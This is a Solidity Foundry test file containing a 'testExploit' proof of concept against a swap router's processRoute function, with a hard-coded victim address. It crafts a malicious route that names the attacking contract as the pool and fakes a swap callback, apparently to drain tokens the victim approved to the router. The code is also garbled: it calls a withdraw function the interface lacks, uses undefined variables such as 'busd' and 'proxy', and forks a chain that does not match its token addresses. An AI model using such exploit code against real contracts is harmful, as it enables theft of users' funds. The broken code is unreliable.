// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console, Test} from "forge-std/Test.sol";
import "../test/interfaces/IERC20.sol";


interface IprocessRoute {
    function processRoute(
        address tokenIn,
        uint256 amountIn,
        address tokenOut,
        uint256 amountOutMin,
        address to,
        bytes memory route
    ) external payable returns (uint256 amountOut);


}

interface IUniswapV3Callback {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

contract MulticallTest is Test {
    
    IprocessRoute router = IprocessRoute(0x83eC81Ae54dD8dca17C3Dd4703141599090751D1);
    IERC20 usdc = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    IERC20 weth = IERC20(0x4200000000000000000000000000000000000006);
    address vic = 0x8294c888166935581584E307825aCe655F100434;
    
    
    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/bsc", 42487497);
    }



    function testExploit() public  {
        uint8 commandCode = 1;
        uint8 num = 1;
        uint16 share = 0;
        uint8 poolType = 0;
        address pool = address(this);
        uint8 zeroForOne = 0;
        address recipient = address(0);
        bytes memory route =
            abi.encodePacked(commandCode, address(weth), num, share, poolType, pool, zeroForOne, recipient);

        IprocessRoute(router).withdraw(vic, busd.balanceOf(address(proxy)) / 2 );

    }

    function swap(
        uint256 amount0out,
        uint256 amount1out,
        address to,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1) {
        amount0 = 0;
        amount1 = 0;
        bytes;
        router.uniswapV3SwapCallback(0, 0, "");
    }
}